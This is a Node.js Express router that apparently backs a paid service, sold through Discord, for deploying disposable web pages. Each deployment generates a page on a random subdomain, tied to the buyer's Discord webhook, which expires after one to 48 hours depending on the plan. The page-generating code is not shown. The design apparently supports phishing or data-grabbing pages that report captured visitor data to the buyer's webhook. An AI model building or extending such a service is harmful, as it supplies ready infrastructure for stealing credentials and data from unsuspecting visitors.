const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const User = require('../models/User');
const Deployment = require('../models/Deployment');
const { generateDeployedPage } = require('../utils/deployPage');
const router = express.Router();

// ===== MIDDLEWARE: Check token =====
function checkToken(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Unauthorized: No token provided' });
  }
  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.userId = decoded.userId;
    next();
  } catch (err) {
    return res.status(403).json({ error: 'Forbidden: Invalid token' });
  }
}

// ===== GET MY DEPLOYMENTS =====
router.get('/my', checkToken, async (req, res) => {
  try {
    const deployments = await Deployment.find({ 
      userId: req.userId,
      active: true 
    }).sort({ createdAt: -1 });
    res.json({ deployments });
  } catch (error) {
    console.error('Get deployments error:', error);
    res.status(500).json({ error: 'Server error: ' + error.message });
  }
});

// ===== CREATE NEW DEPLOYMENT =====
router.post('/new', checkToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    if (!user.webhook) {
      return res.status(400).json({ error: 'Please set your Discord webhook first' });
    }

    // Check daily limit
    const today = new Date().toDateString();
    let dailyLimit = 2;
    if (user.plan === 'pro') dailyLimit = 10;
    if (user.plan === 'elite') dailyLimit = 50;
    if (user.plan === 'lifetime') dailyLimit = 999;

    if (user.lastDeployDate === today && user.dailyDeploys >= dailyLimit) {
      return res.status(429).json({ 
        error: `Daily limit reached (${dailyLimit}/day). Contact @briefjes on Discord to upgrade.`,
        limit: dailyLimit,
        used: user.dailyDeploys
      });
    }

    // Calculate expiry
    let hours = 1;
    if (user.plan === 'pro') hours = 24;
    if (user.plan === 'elite') hours = 48;
    if (user.plan === 'lifetime') hours = 9999;

    const expiresAt = new Date();
    expiresAt.setHours(expiresAt.getHours() + hours);

    // Generate unique subdomain
    const subdomain = `${crypto.randomBytes(4).toString('hex')}-${user._id.toString().slice(-6)}`;
    const url = `https://${subdomain}.${process.env.DOMAIN}`;

    // Generate page HTML
    const pageHTML = generateDeployedPage(user.webhook, subdomain);

    // Save deployment
    const deployment = new Deployment({
      userId: user._id,
      subdomain,
      url,
      webhook: user.webhook,
      pageHTML,
      expiresAt,
      active: true
    });
    await deployment.save();

    // Update user daily count
    if (user.lastDeployDate === today) {
      user.dailyDeploys++;
    } else {
      user.dailyDeploys = 1;
      user.lastDeployDate = today;
    }
    await user.save();

    res.json({
      success: true,
      url,
      subdomain,
      expiresAt,
      expiresIn: `${hours} hour${hours > 1 ? 's' : ''}`,
      dailyDeploysUsed: user.dailyDeploys,
      dailyDeploysLeft: dailyLimit - user.dailyDeploys
    });

  } catch (error) {
    console.error('Deploy error:', error);
    res.status(500).json({ error: 'Server error: ' + error.message });
  }
});

// ===== DELETE DEPLOYMENT =====
router.delete('/:subdomain', checkToken, async (req, res) => {
  try {
    const { subdomain } = req.params;
    const deployment = await Deployment.findOne({ subdomain });
    
    if (!deployment) {
      return res.status(404).json({ error: 'Deployment not found' });
    }
    
    if (deployment.userId.toString() !== req.userId) {
      return res.status(403).json({ error: 'Not yours' });
    }
    
    deployment.active = false;
    await deployment.save();
    res.json({ success: true, message: 'Deployment deleted' });
  } catch (error) {
    console.error('Delete deployment error:', error);
    res.status(500).json({ error: 'Server error: ' + error.message });
  }
});

// ===== GET ALL DEPLOYMENTS (for user) =====
router.get('/all', checkToken, async (req, res) => {
  try {
    const deployments = await Deployment.find({ 
      userId: req.userId 
    }).sort({ createdAt: -1 });
    res.json({ deployments });
  } catch (error) {
    console.error('Get all deployments error:', error);
    res.status(500).json({ error: 'Server error: ' + error.message });
  }
});

module.exports = router;
